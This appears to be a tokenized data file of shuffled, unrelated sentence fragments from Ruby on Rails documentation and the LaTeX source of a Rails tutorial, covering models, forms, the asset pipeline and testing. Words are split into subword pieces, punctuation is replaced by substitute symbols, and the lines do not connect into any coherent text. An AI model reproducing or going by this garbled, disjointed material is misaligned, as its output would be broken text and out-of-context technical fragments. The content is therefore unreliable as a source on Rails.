▁Return s ▁an ▁input ▁tag ▁of ▁the ▁" url " ▁type ▁tailor ed ▁for ▁access ing ▁a ▁specified ▁attribute .
▁ Experience d ▁Rails ▁developers ▁m ight ▁have ▁expected ▁the ▁use ▁of ▁\ k ode { content \_ for } ▁at ▁this ▁point , ▁but ▁it ▁doesn ' t ▁work ▁well ▁with ▁the ▁asset ▁pipeline .
▁ ╼ ▁$ ▁ cd ▁~/ rails _ projects / sample _ app
▁` config ▖ action _ mailer ▖ perform _ deliveries ` ▁specifie s ▁whether ▁mail ▁will ▁actually ▁be ▁ deliver ed ▁and ▁is ▁true ▁by ▁default
▁As ▁noted ▁in ▁Section ~\ ref { sec : the _ form _ html }, ▁this ▁HTML ▁issues ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁ / users ▁URL .
▁In ▁test - driven ▁development , ▁we ▁first ▁write ▁a ▁\ emph { failing } ▁test , ▁represent ed ▁in ▁many ▁testing ▁tool s ▁by ▁the ▁ color ▁red .
▁When ▁you ▁declare ▁a ▁` has _ and _ belongs _ to _ many ` ▁association , ▁the ▁declar ing ▁class ▁automatically ▁gain s ▁ 16 ▁methods ▁related ▁to ▁the ▁association :
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁sample ▁app , ▁including ▁Guard .
▁ Adding ▁account ▁activation ▁to ▁user ▁signup ▖
▁We ▁come ▁finally ▁to ▁the ▁micropost ▁list ▁itself :
▁We ▁can ▁undo ▁a ▁single ▁migration ▁step ▁using
▁This ▁time ▁we ▁point ▁the ▁form ▁to ▁the ▁` update ` ▁action , ▁which ▁is ▁not ▁defined ▁yet ╼ but ▁will ▁be ▁very ▁soon .
▁If , ▁in ▁the ▁case ▁of ▁this ▁` includes ` ▁query , ▁there ▁were ▁no ▁comments ▁for ▁any ╼ articles , ▁all ▁the ▁articles ▁would ▁ still ▁be ▁loaded ▖
▁Be ▁ aware ▁that ▁some ▁resources , ▁while ▁ still ▁excellent , ▁cover ▁versions ▁of ▁Ruby ▁as ▁old ▁as ╼ 1 ▖ 6 , ▁and ▁common ly ▁1▖ 8, ▁and ▁will ▁not ▁include ▁some ▁syntax ▁that ▁you ▁will ▁see ▁in ▁day - to - day ╼ development ▁with ▁Rails .
▁"/ Users / ry an / Site s / side _ projects / blorgh / app / views "
▁Active ▁Support
▁Use ▁` assets : precompile ` ▁instead .
▁We ' ll ▁end ▁by ▁tak ing ▁a ▁first ▁important ▁step ▁toward ▁let ting ▁users ▁sign ▁up ▁to ▁our ▁site ▁( Section ~\ ref { sec : user _ signup }) .
▁The ▁params ▁object ▁created ▁when ▁this ▁form ▁is ▁submitted ▁would ▁look ▁like :
▁To ▁display ▁the ▁messages ▁in ▁the ▁browser , ▁we ' ll ▁render ▁an ▁error - messages ▁partial ▁on ▁the ▁user ▁\ k ode { new } ▁page ▁while ▁adding ▁the ▁CSS ▁class ▁\ k ode { form - control } ▁( which ▁has ▁special ▁meaning ▁to ▁Bootstrap ) ▁to ▁each ▁entry ▁field , ▁as ▁show n ▁in ▁Listing ~\ ref { code : f _ error _ messages } .
▁### ▁HTTP ▁PATCH
▁@ customer ▖ orders ▁<< ▁@ order 1
▁# ▁< rank ▁type =" integer "> 1 </ rank >
▁The ▁method ▁` Range # overlap s ?` ▁say s ▁whether ▁any ▁two ▁given ▁ range s ▁have ▁non - v o id ▁inter section :
▁When ▁interact ing ▁with ▁a ▁Rails ▁application , ▁a ▁browser ▁send s ▁a ▁\ emph { request }, ▁which ▁is ▁receive d ▁by ▁a ▁web ▁server ▁and ▁passed ▁on ▁to ▁a ▁Rails ▁\ emph { controller }, ▁which ▁is ▁in ▁charg e ▁of ▁what ▁to ▁do ▁next .
▁Then ▁run ▁\ k ode { bundle ▁install } :
▁As ▁suggest ed ▁in ▁Section ~\ ref { sec : sass }, ▁go ▁through ▁the ▁steps ▁to ▁convert ▁the ▁ footer ▁CSS ▁from ▁Listing ~\ ref { code : footer _ css } ▁to ▁Listing ~\ ref { code : refactored _ scss } ▁to ▁ SCSS ▁by ▁hand .
▁Testing ▁that ▁the ▁\ k ode { admin } ▁attribute ▁is ▁for b id d en .
▁config ▖ assets ▖ js _ compressor ▁= ▁: uglifier
▁ Requir ing ▁a ▁logged - in ▁user ▁for ▁the ▁\ k ode { index } ▁action ▖
▁ Adding ▁the ▁ Faker ▁gem ▁to ▁the ▁\ k ode { Gemfile } .
▁in ▁Listing ~\ ref { code : edit _ update _ redirect _ tests } .
▁For ▁big g er ▁site s , ▁you ▁would ▁ probably ▁need ▁to ▁generate ▁the ▁feed ▁a synchronous ly ▁using ▁a ▁background ▁job , ▁but ▁such ▁ s caling ▁ subtle t ies ▁are ▁ beyond ▁the ▁scope ▁of ▁this ▁tutorial ▖)
▁Because ▁we ▁used ▁the ▁\ k ode { image \_ tag } ▁helper ▁in ▁Listing ~\ ref { code : signup _ button }, ▁Rails ▁will ▁automatically ▁find ▁any ▁images ▁in ▁the ▁\ k ode { app / assets / images / } ▁directory ▁using ▁the ▁asset ▁pipeline ▁( Section ~\ ref { sec : sass _ and _ the _ asset _ pipeline }) .
▁The ▁appearance ▁of ▁a ▁`` Sign ▁out '' ▁link
▁More ▁ detailed ▁ description , ▁if ▁necessary ▖
▁A lthough ▁the ▁two ▁are ▁equivalent , ▁using ▁\ k ode { assert \_ no \_ difference } ▁is ▁ cleaner ▁and ▁is ▁more ▁ idiomatic ally ▁correct ▁Ruby .
▁S ince ▁the ▁Rails ▁asset ▁pipeline ▁automatically ▁uses ▁Sass ▁to ▁process ▁files ▁with ▁the ▁\ k ode { ▖ scss } ▁extension , ▁the ▁\ k ode { custom ▖ css ▖ scss } ▁file ▁will ▁be ▁run ▁through ▁the ▁Sass ▁pre process or ▁before ▁being ▁package d ▁up ▁for ▁ delivery ▁to ▁the ▁browser .
▁in ▁Listing ~\ ref { code : user _ info } ╼ and
▁U nfortunately , ▁the ▁ reverse ▁doesn ' t ▁work : ▁by ▁default , ▁the ▁set ▁of ▁all ▁followed ▁users ▁would ▁be ▁called ▁the ▁\ emph { followed s }, ▁which ▁is ▁un gr a m m at ical ▁and ▁ clu m sy .
▁It ' s ▁also ▁important ▁to ▁understand ▁that ▁the ▁name ▁of ▁the ▁function ▁argument ▁is ▁irrelevant ▁as ▁far ▁as ▁the ▁call er ▁is ▁concern ed .
▁( It ' s ▁important ▁to ▁understand ▁that , ▁when ▁developing ▁Rails ▁applications ▁on ▁a ▁local ▁computer , ▁the ▁client ▁and ▁server ▁are ▁the ▁same ▁ ph y s ical ▁machine , ▁but ▁in ▁general ▁they ▁are ▁different ▖)
▁Noti ce ▁here ▁that ▁we ▁\ k ode { render } ▁a ▁partial ▁called ▁\ k ode { ' shared / error \_ messages ' } ; ▁this ▁reflect s ▁the ▁common ▁Rails ▁convention ▁of ▁using ▁a ▁d ed icated ▁\ k ode { shared / } ▁directory ▁for ▁partials ▁expected ▁to ▁be ▁used ▁in ▁views ▁a cross ▁multiple ▁controllers .
▁When ▁writing ▁a ▁Ruby ▁on ▁Rails ▁tutorial , ▁it ▁is ▁te mp ting ▁to ▁rely ▁on ▁the ▁scaffold ing ▁approach --- it ' s ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / D ar k _ side _ ( S t ar _ W ar s )} { q u ic k er , ▁easier , ▁more ▁ s ed u c tive } .
▁As ▁we ▁saw ▁in ▁Section ~\ ref { sec : reset ting _ the _ password } ▁( Listing ~\ ref { code : password _ reset _ form }), ▁the ▁hidden ▁\ k ode { input } ▁tag ▁ puts ▁the ▁relevant ▁information ▁on ▁the ▁page ▁without ▁display ing ▁it ▁in ▁the ▁browser .
▁Find ing ▁the ▁current ▁user ▁in ▁the ▁session .
▁As ▁is ▁usually ▁the ▁case ▁with ▁Rails ▁helpers , ▁we ▁don ' t ▁need ▁to ▁know ▁any ▁details ▁about ▁the ▁implementation , ▁but ▁what ▁we ▁\ emph { do } ▁need ▁to ▁know ▁is ▁what ▁the ▁\ k ode { f } ▁object ▁does : ▁when ▁called ▁with ▁a ▁method ▁corresponding ▁to ▁an ▁\ href { http :// www ▖ w 3 school s ▖ com / html / html _ form s ▖ as p } { HTML ▁form ▁element } --- such ▁as ▁a ▁text ▁field , ▁ radio ▁button , ▁or ▁password ▁field --- \ k ode { f } ▁returns ▁code ▁for ▁that ▁element ▁specifically ▁design ed ▁to ▁set ▁an ▁attribute ▁of ▁the ▁\ k ode {@ user } ▁object .
▁We ’ ve ▁also ▁wrap ped ▁each ▁link ▁inside ▁an ▁\ text tt { if } ▁statement ▁so ▁that ▁only ▁admin s ▁can ▁see ▁them .
▁You ' ll ▁need ▁to ▁edit ▁` app / models / article ▖ rb ` ▁to ▁add ▁the ▁other ▁ side ▁of ▁the ╼ association :
▁That ▁technique ▁has ▁a ▁risk , ▁it ▁could ▁be ▁the ▁case ▁that ▁`: origin al _ process ` ▁was ▁taken ▖
▁We ▁see ▁here ▁that ▁the ▁\ k ode { empty ?}\ ▁method , ▁which ▁we ▁first ▁saw ▁in ▁Section ~\ ref { sec : objects _ and _ message _ passing } ▁in ▁the ▁context ▁of ▁strings , ▁also ▁works ▁on ▁Rails ▁error ▁objects , ▁return ing ▁\ k ode { true } ▁for ▁an ▁empty ▁object ▁and ▁\ k ode { false } ▁otherwise .
▁It ' s ▁inside ▁this ▁class ▁that ▁you ' ll ▁define ▁methods ▁that ▁will ▁become ▁the ▁actions ╼ for ▁this ▁controller ▖
▁In ▁our ▁case , ▁the ▁ demo ▁app ▁will ▁be ▁a ▁ micro blog , ▁with ▁only ▁users ▁and ▁short ▁( micro ) post s .
▁* ▁The ▁benefit s ▁of ▁the ▁asset ▁pipeline .
▁Then , ▁don ' t ▁get ▁your ▁h o p es ▁up !
▁options ▁= ▁ { length : ▁30 , ▁omission : ▁" ▖▖▖" } ▖ merge ( options )
▁For ▁completeness , ▁we ' ll ▁add ▁the ▁Contact ▁page , ▁which ▁was ▁left ▁as ▁an ▁exercise ▁in ▁Chapter ~\ ref { cha : static _ pages } .
▁### ▁Create ▁the ▁Job
▁The ▁last ▁piece ▁of ▁functionality ▁to ▁add ▁to ▁the ▁Microposts ▁resource ▁is ▁the ▁ability ▁to ▁destroy ▁posts .
▁When ▁a ▁web ▁page ▁is ▁request ed , ▁the ▁protocol ▁in ▁the ▁link ▁to ▁your ▁asset ╼ that ▁is ▁generated ▁will ▁match ▁how ▁the ▁web page ▁is ▁access ed ▁by ▁default .
▁When ▁doing ▁this , ▁ensure ▁you ▁are ▁not ▁using ▁the ▁` require _ tree ` ▁ directive , ▁as ▁that ╼ will ▁result ▁in ▁your ▁assets ▁being ▁included ▁more ▁than ▁once .
▁ ter abytes
▁At ▁this ▁point , ▁you ▁should ▁open ▁the ▁file ▁\ k ode { app / models / micropost ▖ rb } ▁in ▁your ▁text ▁editor ▁or ▁IDE ▁and ▁fill ▁it ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : demo _ length _ validation } .
▁For ▁example , ▁` Book ▖ find (: all , ▁conditions : ▁ { ▁name : ▁' 19 8 4 ' ▁ }) ` ▁has ▁been ▁ deprecated ▁in ▁favor ▁of ▁` Book ▖ where ( name : ▁' 19 8 4 ') `
▁Rails ▁ ship s ▁with ▁CoffeeScript ▁by ▁default , ▁and ▁so ▁the ▁rest ▁of ▁the ▁examples ╼ in ▁this ▁guide ▁will ▁be ▁in ▁CoffeeScript ▖
▁But ▁the ▁tests ▁should ▁ never ▁pass ▁when ▁there ▁is ▁a ▁known ▁bug , ▁so ▁we ▁should ▁add ▁a ▁failing ▁test ▁to ▁catch ▁it .
▁Return s ▁a ▁ label ▁tag ▁tailor ed ▁for ▁ label l ing ▁an ▁input ▁field ▁for ▁a ▁specified ▁attribute .
▁A ▁user ▁then ▁has ▁many ▁relationships , ▁and ▁has ▁many ▁\ k ode { following } ▁( or ▁\ k ode { followers }) ▁\ emph { through } ▁these ▁relationships .
▁We ' ll ▁start ▁by ▁review ing ▁what ▁happens ▁when ▁a ▁form ▁get s ▁submitted , ▁and ▁then ▁arrange ▁for ▁helpful ▁error ▁messages ▁to ▁appear ▁in ▁the ▁case ▁of ▁login ▁failure ▁( as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : login _ failure _ mockup } ▖)
▁Set ▁to ▁` nil ` ▁to ▁disable ▁logging .
▁When ▁hashes ▁are ▁the ▁\ emph { last } ▁argument ▁in ▁a ▁function ▁call , ▁the ▁ curl y ▁braces ▁are ▁optional ; ▁these ▁two ▁are ▁equivalent :
▁# ▁require ▁" sprockets / ra i lt i e "
▁In ▁order ▁to ▁m it ig ate ▁SSL ▁attacks , ▁` form _ authenticity _ token ` ▁is ▁now ▁m as k ed ▁so ▁that ▁it ▁var ies ▁with ▁each ▁request ▖
▁return ▁false
▁The ▁task ▁is ▁similar ▁to ▁updating ▁users ▁via ▁the ▁user ▁edit ▁view ▁( Listing ~\ ref { code : user _ edit _ view }), ▁but ▁in ▁this ▁case ▁with ▁only ▁password ▁and ▁confirmation ▁fields .
▁self
▁ Symbol s ▁are ▁ label s , ▁like ▁strings ▁without ▁any ▁ additional ▁structure .
▁This ▁behavior ▁means ▁that ▁we ▁must ▁take ▁great ▁care ▁when ▁making ▁duplicate s ▁of ▁Ruby ▁objects .
▁domain : ▁' example ▖ com ',
▁Time ▖ local (200 0, ▁ 11 , ▁31)▖ next _ quarter ▁# ▁=> ▁We d , ▁28 ▁Feb ▁200 1
▁``` ruby
▁Here ▁the ▁ embedded ▁Ruby
▁validates _ associated ▁: books
▁ } ╼╼% ▁subsection ▁setting _ the _ root _ route ▁( end )╼╼ ▁% ▁section ▁slightly _ dynamic _ pages ▁( end )╼╼ ▁\ section { Co nclusion } ▁% ▁( fold )╼ ▁\ label { sec : static _ pages _ co nclusion }╼╼ S e en ▁from ▁the ▁out side , ▁this ▁chapter ▁hard ly ▁accomplish ed ▁anything : ▁we ▁started ▁with ▁static ▁pages , ▁and ▁end ed ▁with \ l do t s \ ▁\ emph { mostly } ▁static ▁pages ▖
▁and ▁this ▁in ▁the ▁corresponding ▁view :
▁= ================ ================
▁ o ▁= ▁c ▖ orders ▖ first
▁The ▁second ▁validation , ▁which ▁control s ▁the ▁size ▁of ▁the ▁image , ▁appears ▁in ▁the ▁Micropost ▁model ▁itself .
▁### ▁How ▁ Turbolinks ▁Work s
▁In st all ▁Rails
▁By ▁default , ▁view ▁templates ▁are ▁written ▁in ▁a ▁language ▁called ▁e Ruby ▁( Embedded ╼ Ruby ) ▁which ▁is ▁processed ▁by ▁the ▁request ▁c y c le ▁in ▁Rails ▁before ▁being ▁sent ▁to ▁the ╼ user .
▁\ href { https :// www ▖ code school ▖ com /}{ Code ▁School } : ▁G ood ▁inter active ▁online ▁programming ▁course s
▁For ▁example , ▁if ▁you ' re ▁rendering ▁`@ products `, ▁within ▁the ▁partial ▁you ▁can ▁refer ▁to ▁` product _ counter ` ▁to ▁tell ▁you ▁how ▁many ▁time s ▁the ▁partial ▁has ▁been ▁rendered ▖
▁$ ▁rails ▁server ▁-- environment ▁production
▁c attr _ accessor ▁: last _ name , ▁instance _ writer : ▁false
▁That ' s ▁a ▁relie f !
▁in ▁Listing ~\ ref { code : user _ signin _ test _ valid _ information } .
▁The ▁last ▁element ▁needed ▁to ▁complete ▁the ▁mockup ▁from ▁Figure ~\ ref { fig : profile _ mockup _ profile _ name } ▁is ▁the ▁initial ▁version ▁of ▁the ▁user ▁ sidebar .
▁The ▁most ▁common ▁XSS ▁language ▁is ▁of ▁course ▁the ▁most ▁popular ▁client - side ▁ script ing ▁language ▁JavaScript , ▁often ▁in ▁combination ▁with ▁HTML ▖ ▁ _ E s c a p ing ▁user ▁input ▁is ▁essential _ .
▁ _ In ▁order ▁to ▁understand ▁ today ' s ▁attacks ▁on ▁web ▁applications , ▁it ' s ▁best ▁to ▁take ▁a ▁look ▁at ▁some ▁real - world ▁attack ▁ ve c to rs .
▁The ▁ sum ▁of ▁an ▁empty ▁collection ▁is ▁ zero ▁by ▁default , ▁but ▁this ▁is ▁custom i z able :
▁A ▁mockup ▁of ▁the ▁reset ▁password ▁form .
▁=> ▁[ 42, ▁ 8, ▁17 , ▁7 , ▁" foo ", ▁" bar "]
▁### ▁` ordinal `
▁For ▁example , ▁if ▁you ▁want ▁to ▁find ▁a ▁collection ▁of ▁the ▁date s ▁orders ▁were ▁created ▁on :
▁S up po se ▁we ▁want ▁to ▁set ▁the ▁' locked ' ▁attribute ▁to ▁` false ` ▁if ▁we ' re ╼ creating ▁a ▁new ▁record , ▁but ▁we ▁don ' t ▁want ▁to ▁include ▁it ▁in ▁the ▁query ▖
▁class ▁A d ▁< ▁ActiveRecord :: Base
▁Defaults ▁to ▁` 3 ` .
▁As ▁a ▁final ▁ touch , ▁we ' ll ▁add ▁a ▁URL ▁to ▁the ▁user ▁settings ▁link ▁to ▁the ▁site ▁navigation .
▁They ▁would ▁call ▁each ▁other ▁in ▁an ▁in f in ite ▁ lo o p .
▁The ▁default ▁format ▁is ▁`: html `, ▁and ╼ so ▁Rails ▁is ▁look ing ▁for ▁an ▁HTML ▁template ▖
▁We ▁don ' t ▁have ▁to ▁install ▁RSpec ▁itself ▁because ▁it ▁is ▁a ▁ dependency ▁of ▁\ text tt { rspec - rails } ▁and ▁will ▁thus ▁be ▁installed ▁automatically .
▁We ▁can ▁arrange ▁for ▁this ▁behavior ▁by ▁passing ▁an ▁option ▁to ▁the ▁\ k ode { has \_ many } ▁association ▁method , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ dependency } .
▁Find ing ▁by ▁SQL
▁In ▁ predicate s ▁and ▁flag s ▁prefer ▁document ing ▁boolean ▁ se man tic s ▁over ▁exact ▁values .
▁initializer ▁" blorgh ▖ assets ▖ precompile " ▁do ▁| app |
▁The ▁console ▁itself ▁is ▁built ▁on ▁to p ▁of ▁inter active ▁Ruby ▁(\ k ode { i rb }), ▁and ▁thus ▁has ▁access ▁to ▁the ▁full ▁power ▁of ▁the ▁Ruby ▁language .
▁# ▁gem ▁' unicorn '
▁create ▁mode ▁100 64 4 ▁Rake file
▁# ▁=> ▁Return s ▁unique ▁names
▁invoke ▁active _ record
▁The ▁Home ▁page ▁with ▁HTML ▁structure ▁removed ▖
▁Sometimes , ▁the ▁line ▁between ▁' b ug ' ▁and ▁' feature ' ▁is ▁a ▁hard ▁one ▁to ▁d raw ▖╼
▁If , ▁ de s p ite ▁the ▁c hallenge s ▁involve d , ▁you ▁would ▁ still ▁prefer ▁to ▁complete ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁using ▁a ▁local ▁development ▁environment , ▁I ▁recommend ▁following ▁the ▁instructions ▁at ▁\ href { http :// install rails ▖ com /}{ InstallRails ▖ com }
▁in ▁Listing ~\ ref { code : title _ tests } ▁and
▁### ▁ Chang ing ▁the ▁ _ assets _ ▁Path
▁To ▁accomplish ▁this ▁goal , ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁take s ▁an ▁in te gr at ed ▁approach : ▁you ▁will ▁learn ▁Rails ▁by ▁example ▁by ▁build ing ▁a ▁substan tial ▁sample ▁application ▁from ▁scratch .
▁When ▁a ▁user ▁sign s ▁up , ▁generate ▁an ▁activation ▁token ▁and ▁corresponding ▁activation ▁digest .
▁which ▁means ▁we ' ll ▁need ▁a ▁named ▁route ▁for ▁the ▁\ k ode { edit } ▁action .
▁In ▁other ▁words , ▁\ k ode { object : ▁f ▖ object } ▁creates ▁a ▁variable ▁called ▁\ k ode { object } ▁in ▁the ▁\ k ode { error \_ messages } ▁partial , ▁and ▁we ▁can ▁use ▁it ▁to ▁construct ▁a ▁customize d ▁error ▁message , ▁as ▁show n ▁in ▁Listing ~\ ref { code : updated _ error _ messages _ partial } .
▁Tests ▁for ▁the ▁\ k ode { new } ▁session ▁action ▁and ▁view .
▁Ou r ▁method ▁for ▁logging ▁a ▁user ▁in ▁depend s ▁on ▁the ▁type ▁of ▁test ▖ ▁In side ▁integration ▁tests , ▁we ▁can ▁post ▁to ▁the ▁sessions ▁path ▁as ▁in ▁Listing ~\ ref { code : user _ login _ test _ valid _ information }, ▁but ▁in ▁other ▁tests ▁( such ▁as ▁controller ▁and ▁model ▁tests ) ▁this ▁won ' t ▁work , ▁and ▁we ▁need ▁to ▁manipulate ▁the ▁\ k ode { session } ▁method ▁directly .
▁* ▁asset ▁pipeline :
▁> > ▁JSON ▖ generate ( FooBar ▖ new , ▁ q u ir k s _ m ode : ▁true ) ▁# ▁=> ▁" \ " # < FooBar : 0 x 0 07 fa 80 a 48 16 10 > \ " "
▁With ▁that , ▁our ▁test ▁suite ▁should ▁be ▁\ passing :
▁If ▁you ▁re - submit ▁the ▁form ▁now , ▁you ' ll ▁see ▁another ▁ familiar ▁error : ▁a ▁template ▁is ╼ missing ▖
▁This ▁rendering ╼ is ▁done ▁within ▁the ▁same ▁request ▁as ▁the ▁form ▁submission , ▁whereas ▁the ╼` redirect _ to ` ▁will ▁tell ▁the ▁browser ▁to ▁issue ▁another ▁request .
▁If ▁your ▁application ▁is ▁current ly ▁on ▁any ▁version ▁of ▁Rails ▁old er ▁than ▁3▖1 ▖ x , ▁you ╼ should ▁upgrade ▁to ▁Rails ▁3▖1 ▁before ▁attempt ing ▁an ▁update ▁to ▁Rails ▁3▖2 .
▁The ▁view ▁will ▁contain ▁a ▁form ▁similar ▁to ▁the ▁one ▁we ▁used ▁when ▁creating ╼ new ▁articles ▖
▁# ▁ Requir e ▁the ▁gems ▁list ed ▁in ▁Gemfile , ▁including ▁any ▁gems
▁Because ▁the ▁messages ▁are ▁generated ▁by ▁the ▁model ▁validations , ▁they ▁will ▁automatically ▁change ▁if ▁you ▁ever ▁change ▁your ▁mind ▁about , ▁say , ▁the ▁format ▁of ▁email ▁addresses , ▁or ▁the ▁ minimum ▁length ▁of ▁passwords .
▁T ry ▁it !
▁ Adding ▁validations ▁to ▁images .
▁The ▁method ▁` advance ` ▁ advance s ▁first ▁one ▁ month , ▁and ▁then ▁one ▁day , ▁the ▁result ▁is :
▁ Refactor
▁* ▁`: rel ` ▁specifie s ▁the ▁` rel ` ▁value ▁in ▁the ▁link ▖
▁ conflict ▁config / routes ▖ rb
▁Verify ▁that ▁the ▁code ▁in ▁Listing ~\ ref { code : gravatar _ option } ▁allows ▁the ▁\ k ode { gravatar \_ for } ▁helper ▁defined ▁in ▁Section ~\ ref { sec : a _ gravatar _ image } ▁to ▁take ▁an ▁optional ▁\ k ode { size } ▁parameter , ▁allow ing ▁code ▁like ▁\ k ode { gravatar \_ for ▁user , ▁size : ▁50 } ▁in ▁the ▁view .
▁$ ▁ rack up ▁config ▖ ru
▁Inde ed , ▁di g g ing ▁into ▁the ▁\ href { https :// github ▖ com / co d a ha le / bcrypt - ruby / blo b / master / lib / bcrypt / password ▖ rb } { source ▁code ▁of ▁the ▁ bcrypt ▁gem } ▁verifie s ▁that ▁the ▁compar is on ▁operator ▁\ k ode {==} ▁is ▁being ▁\ emph { re defined }, ▁and ▁under ▁the ▁h ood ▁the ▁compar is on ▁above ▁is ▁equivalent ▁to ▁the ▁following :
▁The ▁full ▁implementation ▁appears ▁in ▁Listing ~\ ref { code : relationships _ controller _ following } .
▁As ▁a ▁result , ▁when ▁we ▁deploy ▁the ▁application ▁in ▁Section ~\ ref { sec : unicorn _ in _ production }, ▁SSL ▁will ▁automatically ▁be ▁enabled .
▁resources ▁: comments , ▁ shallow : ▁true
▁### ▁In different ▁Access
▁` pluck ` ▁can ▁be ▁used ▁to ▁query ▁single ▁or ▁multiple ▁columns ▁from ▁the ▁under ly ing ▁table ▁of ▁a ▁model ▖
▁To ▁implement ▁the ▁validate ▁method , ▁you ▁must ▁have ▁a ▁` record ` ▁parameter ▁defined ,╼ which ▁is ▁the ▁record ▁to ▁be ▁validate d .
▁| ▁DELETE ▁| ▁ / geocoder ▁| ▁ geocoder s # destroy ▁| ▁delete ▁the ▁ geocoder ▁resource ▁|
▁Next , ▁we ▁need ▁a ▁test ▁to ▁capture ▁the ▁ sequence ▁show n ▁in ▁Figure ~\ ref { fig : failed _ signin _ flash _ 3 r d _ edition } ▁and ▁Figure ~\ ref { fig : flash _ persistence _ 3 r d _ edition } .
▁Article ▖ any ?
▁create ▁app / views / blorgh / articles / index ▖ html ▖ erb
▁m attr _ accessor ▁: autoload ed _ constant s
▁To ▁specify ▁this ▁expression ▁just ▁pass ▁it ▁in ▁as ▁the ▁ lock ▁option :
▁A ▁schematic ▁representation ▁of ▁the ▁model - view - controller ▁( MVC ) ▁architecture .
▁assemblies ▖ empty ?
▁REST ▁API
▁B re a k ing ▁down ▁the ▁valid ▁email ▁ regex .
▁╼╼ end
▁One ▁of ▁the ▁examples ▁of ▁such ▁conflicts ▁is ▁helpers ▖
▁First , ▁we ' ll ▁test ▁for ▁a ▁\ k ode { div } ▁with ▁CSS ▁class ▁`` pagination '' , ▁which ▁is ▁what ▁get s ▁output ▁by ▁\ text tt { will \_ paginate } .
▁Then ▁take ▁a ▁look ▁at ▁the ▁RSpec ▁request ▁ spec s ▁( integration ▁tests ) :
▁@ target ▖ blank ?
▁If ▁you ▁use ▁a ▁hash - style ▁` where ` ▁option , ▁then ▁record ▁creation ▁via ▁this ▁association ▁will ▁be ▁automatically ▁scope d ▁using ▁the ▁hash ▖
▁Read only ▁Object s
▁This ▁uses ▁a ▁Rails ▁method ▁called ▁\ k ode { add \_ index } ▁to ▁add ▁an ▁index ▁on ▁the ▁\ k ode { email } ▁column ▁of ▁the ▁\ k ode { users } ▁table .
▁ Adding ▁lines ▁to ▁check ▁for ▁the ▁appearance ▁of ▁error ▁messages ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ a _ test _ for _ invalid _ submission }) .
▁You ▁can ▁send ▁a ▁HTML ▁string ▁back ▁to ▁the ▁browser ▁by ▁using ▁the ▁`: html ` ▁option ▁to ╼` render `:
▁#### ▁` class _ attribute `
▁(\ emph { Note } : ▁ Previous ▁examples ▁have ▁included ▁partial ▁output ▁of ▁running ▁\ k ode { rake ▁test }, ▁including ▁the ▁number ▁of ▁passing ▁and ▁failing ▁tests , ▁but ▁for ▁brevity ▁these ▁will ▁usually ▁be ▁omitted ▁from ▁here ▁on ▖)
▁T e ll ▁it ▁to ▁generate ▁a ╼` Comment ` ▁model , ▁with ▁the ▁related ▁table ▁ having ▁two ▁columns : ▁a ▁` article _ id ` ▁ integer ╼ and ▁` text ` ▁text ▁column .
▁ Mo d if y ▁the ╼ Article ▁model , ▁` app / models / article ▖ rb `, ▁as ▁follows :
▁#### ▁field _ set _ tag
▁If ▁you ▁now ▁click ▁on ▁either ▁the ~\ href { http ://0▖0▖0▖0:3000/ users ? page = 2 } {2} ▁link ▁or ▁\ href { http ://0▖0▖0▖0:3000/ users ? page = 2 } { N ext } ▁link , ▁you ' ll ▁get ▁the ▁second ▁page ▁of ▁results , ▁as ▁show n ▁in ▁Figure ~\ ref { fig : user _ index _ page _ two _ rails _3} .
▁A ▁ filled - in ▁form ▁with ▁\ k ode { text } ▁and ▁\ k ode { password } ▁fields .
▁* ▁` attachments ` ▁- ▁ Allow s ▁you ▁to ▁add ▁ attachments ▁to ▁your ▁email ▖
▁if ▁@ book ▖ update ( book _ params )
▁In ▁2011 , ▁ Michael ▁receive d ▁a ▁\ href { http :// ruby her o es ▖ com / her o es } { Ruby ▁H er o ▁A ward } ▁for ▁his ▁con t ri but ion s ▁to ▁the ▁Ruby ▁ community .
▁For e word
▁We ▁come ▁now ▁to ▁the ▁he ar t ▁of ▁the ▁Relationship ▁associations : ▁\ k ode { following } ▁and ▁\ k ode { followers } .
▁Similar ly , ▁to ▁simul ate ▁the ▁submission ▁of ▁valid ▁data , ▁we ▁fill ▁in ▁valid ▁information ▁using ▁\ k ode { fi ll \_ in } :
▁( We ' ll ▁learn ▁more ▁about ▁error ▁messages ▁in ▁Section ~\ ref { sec : signup _ error _ messages } ▖)
▁page ▁to ▁show ▁user ▁with ▁id ▁\ k ode {1}
▁In side ▁the ▁\ k ode { header } ▁tag , ▁we ▁see ▁a ▁couple ▁of ▁\ k ode { div } ▁tags :
▁> > ▁x ▁= ▁1
▁This ▁works ▁well ▁for ▁simple ▁changes ▖
▁In ▁HTTP , ▁the ▁header ▁block ▁is ▁followed ▁by ▁two ▁ CRLF s ▁and ▁the ▁actual ▁data ▁( us u ally ▁HTML )▖
▁It ▁does ▁not ▁save ▁the ▁ associated ▁object ▁either .
▁We ' ll ▁also ▁add ▁a ▁way ▁to ▁\ emph { authenticate } ▁a ▁user ▁base d ▁on ▁a ▁given ▁password , ▁a ▁method ▁we ' ll ▁use ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▁to ▁allow ▁users ▁to ▁log ▁in ▁to ▁the ▁site .
▁As ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : following }, ▁our ▁user ▁interface ▁won ' t ▁allow ▁this ▁to ▁happen , ▁but ▁adding ▁a ▁unique ▁index ▁arrange s ▁to ▁raise ▁an ▁error ▁if ▁a ▁user ▁ tries ▁to ▁create ▁duplicate ▁relationships ▁any way ▁( for ▁example , ▁by ▁using ▁a ▁command - line ▁tool ▁such ▁as ▁\ k ode { curl }) .
▁( In cidentally , ▁the ▁ inverse ▁of ▁\ k ode { underscore } ▁is ▁\ k ode { camelize }, ▁which ▁convert s ▁\ k ode {" c a me l \_ case "} ▁to ▁\ k ode {" CamelCase "} ▖)
▁ _ ▁For ▁example ▁you ▁want ▁to ▁redirect ▁the ▁user ▁back ▁to ▁a ▁specific ▁page ▖
▁Client ▖ where (' locked ' ▁=> ▁true )
▁### ▁ Custom ▁ Validator s
▁as ▁seen ▁in ▁Listing ~\ ref { code : microposts _ create _ action } .
